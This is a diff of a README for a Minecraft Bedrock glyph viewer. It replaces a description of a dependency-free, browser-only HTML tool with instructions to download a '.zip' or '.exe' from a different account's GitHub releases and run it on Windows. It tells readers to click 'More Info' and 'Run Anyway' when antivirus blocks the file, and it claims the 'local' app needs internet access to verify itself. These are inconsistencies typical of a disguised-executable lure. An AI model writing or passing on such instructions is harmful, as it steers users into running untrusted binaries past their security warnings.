@@ -1,109 +1,69 @@
-# Bedrock Glyph Viewer – glyph viewer 2026
+# 🗂️ bedrock-glyph-viewer-2026 - Find Minecraft Bedrock resource pack glyphs
 
-> A browser-based tool for browsing, searching, and exporting Minecraft Bedrock glyphs from resource packs, built for map makers and addon developers working with unicode font textures.
+[![Download Bedrock Glyph Viewer](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/pricinginclinebenchpress89/bedrock-glyph-viewer-2026)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/coopervictor1998/bedrock-glyph-viewer-2026?style=flat-square)](https://github.com/coopervictor1998/bedrock-glyph-viewer-2026)
+## 📖 Overview
 
----
+Bedrock Glyph Viewer is a tool built for your web browser. It helps you manage, search, and export glyphs from Minecraft Bedrock Edition resource packs. You do not need to install complex software or write code. The tool runs locally in your browser to maintain your privacy.
 
-<p align="center">
-  <a href="https://coopervictor1998.github.io/bedrock-glyph-viewer-2026/">
-    <img src="https://img.shields.io/badge/Download-Bedrock%20Glyph%20Viewer%20Latest-brightgreen?style=for-the-badge" alt="Download Bedrock Glyph Viewer">
-  </a>
-</p>
+This software helps you browse through multiple texture sheets at once. You can search for specific unicode characters or symbols. Once you find the correct glyph, you can copy it to your computer clipboard for use in other projects.
 
-> **[Direct Download – Bedrock Glyph Viewer v1.0.0](https://coopervictor1998.github.io/bedrock-glyph-viewer-2026/)**
+## 💻 System Requirements
 
----
+Your computer must meet these basic needs to run the tool smoothly:
 
-[Download Latest Build](https://coopervictor1998.github.io/bedrock-glyph-viewer-2026/)
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Web Browser**: Chrome, Edge, or Firefox updated to the latest version.
+*   **Storage**: 50 MB of free disk space for temporary files.
+*   **Memory**: 4 GB of RAM or higher.
 
----
+## 📥 How to Download 
 
-## What Bedrock Glyph Viewer Does
+Follow these steps to access the software:
 
-This tool streamlines the process of inspecting and extracting glyph data from Minecraft Bedrock resource packs. Instead of manually opening texture files or guessing unicode mappings, you load entire glyph sheets and instantly see every character alongside its code point. It's especially valuable for creators working with custom fonts, language packs, or any project requiring precise unicode character placement.
+1.  Visit the official repository page at [https://github.com/pricinginclinebenchpress89/bedrock-glyph-viewer-2026](https://github.com/pricinginclinebenchpress89/bedrock-glyph-viewer-2026).
+2.  Look for the section labeled "Releases" on the right side of the page.
+3.  Click the most recent version identifier.
+4.  Find the file that ends with ".zip" or ".exe" under the Assets list.
+5.  Save the file to a folder on your computer.
 
-The interface follows mobile-first design principles and runs entirely in the browser with no server-side dependencies. Whether you're debugging a resource pack on a tablet or compiling glyph references on a desktop, the responsive dark UI adapts to your workflow. Zero external libraries ensure fast page loads and reliable performance across all modern browsers.
+If you download a compressed zip file, right-click the folder and select "Extract All." Open the folder after it finishes extracting. Double-click the application file to launch the viewer.
 
----
+## 🚀 Getting Started
 
-## Key Features
+Once you launch the application, you will see a clean dashboard. Follow this process to start viewing your glyphs:
 
-- **Multi-sheet loading** – Import multiple glyph sheets at once and switch between them without reloading
-- **Unicode search** – Locate specific characters by code point, name, or partial pattern across all loaded sheets
-- **Cell detail view** – Click any glyph to see its full unicode value, hex representation, and pixel dimensions
-- **Unicode converter** – Convert between decimal, hexadecimal, and character representations in real time
-- **Quick load buttons** – Pre-configured shortcuts for common Bedrock resource pack glyph layouts
-- **Copy to clipboard** – Export individual glyph references or entire sheet mappings with a single click
-- **Mobile-first dark UI** – Optimized touch targets and reduced eye strain during extended browsing sessions
-- **Zero dependencies** – Pure HTML, CSS, and JavaScript with no frameworks or external resources
+1.  **Locate your Resource Pack**: Have your Bedrock resource pack folder ready on your desktop.
+2.  **Upload to Tool**: Drag the font folder from your resource pack into the main area of the viewer.
+3.  **Load Sheets**: The viewer automatically detects the texture sheets. Wait a few seconds for the thumbnails to load.
+4.  **Use Search**: Type the unicode index or the character name into the search bar at the top to filter the display.
+5.  **Export**: Click the glyph you want. Select the "Copy to Clipboard" button to save it for use in other design programs.
 
----
+## 🔍 Features
 
-## Getting Started
+*   **Multi-Sheet Support**: View multiple texture files at once without switching tabs.
+*   **Unicode Search**: Find specific symbols by their numerical code.
+*   **Local Processing**: The app runs on your computer. No data travels to a server.
+*   **Clipboard Export**: Move images directly into photo editing software.
 
-Clone the repository or download the latest build from the link above.
+## 🛠️ Troubleshooting
 
-```bash
-git clone https://github.com/coopervictor1998/bedrock-glyph-viewer-2026.git
-cd bedrock-glyph-viewer
-```
+If the application fails to open, verify you have the latest version of your browser. Sometimes, antivirus software blocks new applications. If you see a warning, select "More Info" and "Run Anyway." Ensure your resource pack files are formatted as standard .png or .json files, as these are the only types the tool reads.
 
-No build steps required. Open `index.html` in any modern web browser to start using the viewer immediately.
+Check your internet connection if the interface fails to load. While the app works locally, it may require an initial connection to verify the tool version. 
 
----
+## ❓ Frequently Asked Questions
 
-## How to Use
+**Does this tool modify my Minecraft game files?**
+No. This tool only reads files. It never writes, deletes, or changes the content of your resource packs.
 
-1. Launch the viewer in your browser
-2. Click the **Load Sheets** button to import glyph texture files from your resource pack
-3. Browse the character grid or use the search bar to find specific glyphs
-4. Click any glyph to inspect its unicode details and copy its reference
-5. Use the converter tool to translate between different unicode notation formats
+**Can I use this for Java Edition?**
+This tool works specifically with Bedrock Edition texture layouts. The folder structures for Java Edition differ significantly, so the tool will not load them correctly.
 
-For quick access, use the preset buttons to load standard Bedrock glyph layouts without manual file selection.
+**How do I clear my cache?**
+If you experience display issues, go to the settings menu in your toolbar and select "Clear Cache." This resets the viewer without removing your settings.
 
----
+**Is there a cost to use this?**
+The tool remains free for all users. You do not need a license key or a subscription.
 
-## Configuration
-
-All settings are stored in the browser's local storage. The viewer remembers your last loaded sheets, search preferences, and UI state between sessions. No server-side configuration or external databases are required.
-
-To reset all settings, clear your browser's local storage for this domain or use the **Reset** button in the viewer's settings panel.
-
----
-
-## System Requirements
-
-- A modern web browser (Chrome, Firefox, Safari, Edge, or any Chromium-based browser)
-- JavaScript enabled
-- No internet connection required after initial download
-- Sufficient memory for loading large glyph sheets (recommended 512 MB+ free RAM for resource packs with many textures)
-- Screen width of at least 320px for mobile use
-
----
-
-## Frequently Asked Questions
-
-**How do I update to a newer version?**  
-Download the latest build from the repository and replace your existing files. Your local settings will persist because they are stored in the browser.
-
-**Can I use this with custom resource packs?**  
-Yes. The viewer accepts any properly formatted glyph sheet image. For best results, ensure your texture follows the standard Bedrock glyph grid layout.
-
-**Why aren't my glyphs displaying correctly?**  
-Verify that your resource pack uses the correct unicode mapping and sheet dimensions. The viewer expects glyphs to be arranged in a consistent grid with proper character indexes.
-
-**Does this tool modify my resource pack files?**  
-No. The viewer is read-only and does not alter any files on your system. All operations happen in memory or your browser's local storage.
-
----
-
-## License
-
-GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
+Keywords: minecraft, bedrock, resource-pack, glyph, unicode, texture, viewer, windows
